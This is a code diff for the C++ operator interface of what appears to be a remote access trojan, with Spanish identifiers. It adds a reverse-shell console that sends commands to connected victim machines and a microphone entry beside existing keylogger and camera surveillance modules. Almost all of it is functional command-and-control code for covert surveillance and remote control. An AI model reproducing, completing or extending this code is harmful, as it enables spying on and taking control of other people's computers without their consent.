@@ -5,12 +5,12 @@
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
-FrameCliente::FrameCliente(std::string strID, int iID)
-    : wxFrame(nullptr, iID, ":v")
+FrameCliente::FrameCliente(std::string strID, wxString nameID)
+    : wxFrame(nullptr, wxID_ANY, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
 {
 
-    std::vector<std::string> vcOut = strSplit(strID, '/', 1);
-    this->strClienteID = vcOut[0];
+    //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
+    this->strClienteID = nameID;
 
     std::unique_lock<std::mutex> lock(vector_mutex);
     for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
@@ -47,6 +47,7 @@ FrameCliente::FrameCliente(std::string strID, int iID)
     this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));
 
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
+    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     
     this->m_tree->AppendItem(rootMisc, wxT("Testing"));
@@ -81,19 +82,39 @@ Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo 
 
     SetClientSize(800, 450);
     SetSizeHints(820, 485, 820, 485);
-    
-    //this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");
 
 
+}
 
+void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
+    int closedPage = event.GetSelection();
+    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
+    if (pageTitle == "Reverse Shell") {
+        //Enviar comando para cerrar shell al cerra la tab
+        std::unique_lock<std::mutex> lock(vector_mutex);
+
+        for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
+            if (aClient->_id == this->strClienteID) {
+                if (aClient->_isRunningShell) {
+                    aClient->_isRunningShell = false;
+                    std::string strComando = "exit\r\n";
+                    p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
+                }
+                break;
+            }
+        }
+        lock.unlock();
+    }
+    event.Skip();
 }
 
 void FrameCliente::OnTest(wxCommandEvent& event) {
     std::vector<struct Cliente> vc_Copy;
     std::unique_lock<std::mutex> lock(vector_mutex);
+    
     vc_Copy = p_Servidor->vc_Clientes;
     lock.unlock();
-
+    
     for (auto aClient : vc_Copy) {
         if (aClient._id == this->strClienteID) {
             int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
@@ -104,38 +125,26 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 }
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
-    std::lock_guard<std::mutex> lock(vector_mutex);
+    std::unique_lock<std::mutex> lock(vector_mutex);
+    
     for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
         if (iter->_id == this->strClienteID) {
             iter->_isBusy = false;
             iter->_ttUltimaVez = time(0);
+            std::cout << "running shell?: " << iter->_isRunningShell << std::endl;
+            if (iter->_isRunningShell) {
+                iter->_isRunningShell = false;
+                std::string strComando = "exit\r\n";
+                p_Servidor->cSend(iter->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
+            } 
             break;
         }
         ++iter;
     }
+    
+    lock.unlock();
 
     event.Skip();
-}
-
-void MyTreeCtrl::CrearNotebook() {
-    this->p_Notebook = new wxAuiNotebook(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, 
-        wxAUI_NB_CLOSE_ON_ACTIVE_TAB);
-
-    this->p_Notebook->Freeze();
-    wxPanel *m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
-    m_BPanel->SetBackgroundColour(wxColor(0, 255, 0)); // REMOVE AT THE END
-
-    this->p_Notebook->AddPage(m_BPanel, "Testing", false);
-    /*this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);
-
-    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 2");
-
-    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 3");*/
-    this->p_Notebook->Thaw();
-   
 }
 
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
@@ -158,6 +167,10 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         if (wStr == "Testing") {
             this->p_Notebook->AddPage(new panelTest(this), wStr, true);
         }
+
+        if (wStr == "Reverse Shell") {
+            this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
+        }
         //this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
         
         this->p_Notebook->Thaw();
@@ -167,6 +180,106 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
 
 //Modulos
 panelTest::panelTest(wxWindow* pParent) :
-    wxPanel(pParent) {
+    wxPanel(pParent, EnumIDS::ID_Panel_Test) {
     wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
+    this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
+}
+
+panelReverseShell::panelReverseShell(wxWindow* pParent) :
+    wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
+    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
+    if (wxTree) {
+        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
+        if (panel_cliente) {
+            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
+            if (frame_cliente) {
+                this->strID = frame_cliente->strClienteID;
+            }
+        }
+    }
+    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(600-5, 410), wxTE_MULTILINE);
+    this->txtConsole->SetForegroundColour(*wxWHITE);
+    this->txtConsole->SetBackgroundColour(*wxBLACK);
+
+    Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
+
+    //Enviar comando al cliente para que ejecute
+    std::unique_lock<std::mutex> lock(vector_mutex);
+
+    for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
+        if (aClient->_id == this->strID) {
+            aClient->_isRunningShell = true;
+            std::string strComando = "RSHELL~notepad.exe";
+            int ib = p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
+            break;
+        }
+    }
+    lock.unlock();
+
+}
+
+void panelReverseShell::OnHook(wxKeyEvent& event) {
+    //long last_position = this->txtConsole->GetLastPosition();
+    long current_pos = this->txtConsole->GetInsertionPoint();
+    int iCode = event.GetKeyCode();
+    if (iCode == WXK_LEFT || iCode == WXK_BACK) {
+        //Si retrocedio hasta el ultimo regresarlo
+        if (current_pos <= this->p_uliUltimo) {
+            this->txtConsole->SetInsertionPoint(this->p_uliUltimo);
+        }else {
+            event.Skip();
+        }
+    }else if (iCode == WXK_UP) {
+        //Historial de comandos?
+        if (this->vc_History.size() > 0) {
+            if (this->iHistorialPos > 0) {
+                this->iHistorialPos--;
+            }
+            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
+            wxString strTmp = this->vc_History[this->iHistorialPos];
+            this->txtConsole->AppendText(strTmp);
+            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+        }
+    }else if (iCode == WXK_DOWN) {
+        if (this->vc_History.size() > 0) {
+            if (this->iHistorialPos + 1 < this->vc_History.size()) {
+                this->iHistorialPos++;
+            }
+            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
+            wxString strTmp = this->vc_History[this->iHistorialPos];
+            this->txtConsole->AppendText(strTmp);
+            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+            
+        }
+    }else if (iCode == WXK_RETURN) {
+        wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
+        int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
+        wxString str1 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
+        this->vc_History.push_back(str1);
+
+        str1.append(1, '\r');
+        str1.append(1, '\n');
+        std::vector<struct Cliente> vc_Copy;
+        std::unique_lock<std::mutex> lock(vector_mutex);
+
+        vc_Copy = p_Servidor->vc_Clientes;
+        lock.unlock();
+
+        for (auto vcCli : vc_Copy) {
+            if (vcCli._id == this->strID) {
+                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size(), 0, false);
+                break;
+            }
+        }
+        
+        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
+        //std::cout << "Ultima posicion ahora es " << this->p_uliUltimo<< std::endl;
+          
+          event.Skip();
+    } else {
+        if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
+            this->txtConsole->SetInsertionPointEnd();
+        }
+        event.Skip();
+    }
 }
